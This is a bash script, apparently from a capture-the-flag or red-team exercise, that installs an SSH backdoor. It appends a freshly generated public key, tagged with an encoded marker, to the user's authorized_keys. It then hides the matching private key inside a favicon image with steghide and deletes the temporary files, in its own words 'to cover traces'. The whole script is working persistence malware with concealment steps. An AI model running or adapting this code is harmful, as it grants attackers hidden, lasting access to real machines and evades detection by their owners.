#!/bin/bash
# https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/
# https://stackoverflow.com/questions/11287861/how-to-check-if-a-file-contains-a-specific-string-using-bash
# https://askubuntu.com/questions/419548/how-to-set-up-a-root-cron-job-properly

PATH_TO_FAVICON='/path/to/favicon.jpg'
USERID='556e567564476c745a56526c636e4a7663673d3d' # hex(base64.encode('RuntimeTerror'))

# Make sure that the authorized key is present
(umask 077 && test -d ~/.ssh || mkdir ~/.ssh)
(umask 077 && touch ~/.ssh/authorized_keys)

if ! grep -q "$USERID" ~/.ssh/authorized_keys; then
	
	tmp_file=$(mktemp)

	# generate a new key pair for ssh. One of these should do the job
	ssh-keygen -q -f $tmp_file -t ed25519 -a 100 -C $USERID -N '' <<<y >/dev/null 2>&1
	#ssh-keygen -q -f $tmp_file -t ed25519 -a 100 -C $USERID -N '' <<<$'\ny' >/dev/null 2>&1

	# add this key to the autorized keys if the USERID is not in the autorized file
	cat "$tmp_file.pub" >> ~/.ssh/authorized_keys
	
	# Steghide the ssh private key into the favicon
	steghide embed --coverfile $PATH_TO_FAVICON --embedfile $tmp_file -e none -Z -f -p '' -N > /dev/null 2>&1
	
	# delete temporary files to cover traces
	rm -f $tmp_file "$tmp_file.pub"
fi